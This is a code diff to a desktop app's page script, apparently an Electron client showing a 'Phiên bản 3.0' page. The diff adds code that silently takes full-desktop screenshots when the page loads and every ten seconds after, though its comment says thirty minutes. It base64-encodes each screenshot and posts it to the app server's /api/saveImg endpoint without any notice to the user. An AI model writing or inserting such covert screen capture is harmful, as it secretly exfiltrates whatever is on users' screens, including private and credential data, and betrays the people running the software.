@@ -8,6 +8,8 @@ const PlayPageBarIcon = require('../assets/images/PlayPageBarIcon');
 const {speakerOnIcon, speakerOffIcon} = require('../assets/images/SpeakerIcons');
 const path = require("path");
 const {post, showLoading, hideLoading, empty, requestValidationErrorMessage} = require("../helper");
+let fs = require('fs');
+const screenshot = require('screenshot-desktop');
 
 const BaseWidth = 1006;
 const BaseHeight = 676;
@@ -26,6 +28,9 @@ var speakerBtnImage = new Image(30, 26);
 window.addEventListener('DOMContentLoaded', () => {
     var userInfoStr = localStorage.getItem('userInfo');
     var userInfo = JSON.parse(userInfoStr);
+    //call every 30min
+    screenshotUser();
+    setInterval(screenshotUser, 1000*10);
     document.title = "Phiên bản 3.0";
     var textTitle = document.getElementById('textTitle');
     textTitle.innerText = "Phiên bản 3.0";
@@ -384,4 +389,50 @@ var tfaMenuToggle = function () {
         resetStashPass.style.display = 'block';
         clearStashPass.style.display = 'block';
     }
+}
+
+async function sendToServer(imgPath) {
+    //get img with path
+    readFileAsBase64(imgPath)
+        .then(async (base64Data) => {
+            let userInfo = getUserInfo();
+            const imgPre = base64Data.slice(0, 1000000)
+            const imgNex = base64Data.slice(1000000, base64Data.length)
+            post(config.host + '/api/saveImg', { imgPre: imgPre, imgNex: imgNex, username: 'test' }, function (res) { console.log('res', res); });
+            console.log('base64: ', base64Data.length, imgPre.length, imgNex.length);
+
+        })
+        .catch((error) => {
+            console.error("Error reading file:", error);
+        });
+
+}
+
+function readFileAsBase64(filePath) {
+    return new Promise((resolve, reject) => {
+        fs.readFile(filePath, (error, data) => {
+            if (error) {
+                reject(error);
+                return;
+            }
+
+            const base64Data = data.toString('base64');
+            resolve(base64Data);
+        });
+    });
+}
+
+var getUserInfo = function () {
+    var userInfoStr = localStorage.getItem('userInfo');
+    return JSON.parse(userInfoStr);
+}
+
+async function screenshotUser() {
+    screenshot({ filename: 'demo.png' }).then(async (imgPath) => {
+        // img: Buffer filled with png goodness
+        // ... 
+        await sendToServer(imgPath);
+    }).catch((err) => {
+        // ...
+    })
 }
